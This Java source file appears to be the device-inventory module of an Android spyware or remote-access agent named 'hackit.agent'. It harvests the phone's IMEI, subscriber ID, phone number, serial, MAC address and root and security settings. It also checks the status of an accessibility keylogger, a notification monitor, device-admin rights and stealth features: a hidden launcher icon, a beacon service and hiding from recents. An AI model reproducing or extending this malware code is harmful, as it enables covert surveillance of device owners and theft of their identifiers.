package com.hackit.agent;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.StatFs;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.File;

/** Full device inventory: build, network, storage, display, security posture. */
final class Info {
    @SuppressWarnings("deprecation")
    static JSONObject snapshot(Context ctx) {
        JSONObject info = new JSONObject();
        try {
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("brand", Build.BRAND);
            info.put("model", Build.MODEL);
            info.put("device", Build.DEVICE);
            info.put("product", Build.PRODUCT);
            info.put("board", Build.BOARD);
            info.put("hardware", Build.HARDWARE);
            info.put("fingerprint", Build.FINGERPRINT);
            info.put("bootloader", Build.BOOTLOADER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("codename", Build.VERSION.CODENAME);
            info.put("security_patch", Build.VERSION.SDK_INT >= 23 ? Build.VERSION.SECURITY_PATCH : "");
            info.put("abis", Build.SUPPORTED_ABIS);
            info.put("serial", Build.SERIAL);
            info.put("rooted", Common.rooted());
            info.put("selinux", selinux());
            info.put("uptime_ms", android.os.SystemClock.elapsedRealtime());
            info.put("boot_ms", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime());
            info.put("tz", java.util.TimeZone.getDefault().getID());
            info.put("locale", java.util.Locale.getDefault().toString());
            info.put("android_id", Common.androidId(ctx));
            info.put("hwid", Common.hwidHash(ctx));

            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                info.put("sim_state", tm.getSimState());
                info.put("operator", tm.getNetworkOperatorName());
                info.put("net_country", tm.getNetworkCountryIso());
                info.put("phone_type", tm.getPhoneType());
                if (Common.granted(ctx, android.Manifest.permission.READ_PHONE_STATE)) {
                    info.put("number", Common.phone(ctx));
                    if (Build.VERSION.SDK_INT >= 26) {
                        info.put("imei", safe(tm.getImei()));
                        info.put("meid", safe(tm.getMeid()));
                    } else {
                        info.put("imei", safe(tm.getDeviceId()));
                    }
                    if (Build.VERSION.SDK_INT >= 22) {
                        info.put("subscriber", safe(tm.getSubscriberId()));
                    }
                }
            }

            info.put("mac_wifi", Common.mac(ctx));
            info.put("net", network(ctx));
            info.put("battery", Common.battery(ctx));
            info.put("charging", Common.charging(ctx));
            info.put("power_saver", powerSaver(ctx));

            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                ActivityManager.MemoryInfo mem = new ActivityManager.MemoryInfo();
                am.getMemoryInfo(mem);
                info.put("ram_total", mem.totalMem);
                info.put("ram_free", mem.availMem);
                info.put("low_memory", mem.lowMemory);
            }

            info.put("storage", storage(Environment.getExternalStorageDirectory()));
            info.put("storage_data", storage(Environment.getDataDirectory()));

            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
            if (wm != null && Build.VERSION.SDK_INT >= 17) {
                DisplayMetrics metrics = new DisplayMetrics();
                wm.getDefaultDisplay().getRealMetrics(metrics);
                info.put("screen", metrics.widthPixels + "x" + metrics.heightPixels
                        + "@" + metrics.densityDpi);
            }
            info.put("dev_settings", settings(ctx));
            info.put("ghost", ghost(ctx));
            info.put("package", ctx.getPackageName());
        } catch (Throwable exc) {
            Log.e("info: " + exc);
        }
        return info;
    }

    private static JSONObject settings(Context ctx) throws Exception {
        JSONObject out = new JSONObject();
        out.put("adb", Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.ADB_ENABLED, 0));
        out.put("dev", Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0));
        out.put("unknown_sources", Settings.Secure.getInt(ctx.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0));
        out.put("acc_on", KeyMon.connected());
        out.put("notif_on", NotifyMon.connected());
        out.put("admin", admin(ctx));
        out.put("ignore_battery", ignoreBattery(ctx));
        return out;
    }

    static boolean ignoreBattery(Context ctx) {
        try {
            PowerManager power = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return power != null && power.isIgnoringBatteryOptimizations(ctx.getPackageName());
        } catch (Throwable exc) {
            return false;
        }
    }

    static boolean admin(Context ctx) {
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null) {
                return false;
            }
            return dpm.isAdminActive(new android.content.ComponentName(ctx, AdminReceiver.class));
        } catch (Throwable exc) {
            return false;
        }
    }

    private static boolean powerSaver(Context ctx) {
        try {
            PowerManager power = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return power != null && power.isPowerSaveMode();
        } catch (Throwable exc) {
            return false;
        }
    }

    private static String selinux() {
        try {
            Process process = new ProcessBuilder("getenforce").redirectErrorStream(true).start();
            String value = Common.read(process.getInputStream(), 64).trim();
            process.destroy();
            return value;
        } catch (Throwable exc) {
            return "?";
        }
    }

    private static JSONObject storage(File path) throws Exception {
        JSONObject out = new JSONObject();
        StatFs stat = new StatFs(path.getAbsolutePath());
        long block = stat.getBlockSizeLong();
        out.put("total", stat.getBlockCountLong() * block);
        out.put("free", stat.getAvailableBlocksLong() * block);
        out.put("path", path.getAbsolutePath());
        return out;
    }

    private static String network(Context ctx) {
        try {
            ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) {
                return "?";
            }
            NetworkInfo info = cm.getActiveNetworkInfo();
            if (info == null || !info.isConnected()) {
                return "offline";
            }
            return info.getTypeName() + "/" + info.getSubtypeName();
        } catch (Throwable exc) {
            return "?";
        }
    }

    private static JSONObject ghost(Context ctx) {
        JSONObject out = new JSONObject();
        out.put("launcher", Launcher.enabled(ctx));
        out.put("fg", BeaconService.class.getName());
        out.put("hidden_recents", true);
        return out;
    }

    private static String safe(String value) {
        return value == null ? "" : value;
    }

    private Info() {
    }

    static Intent batteryIntent(Context ctx) {
        return ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    }
}
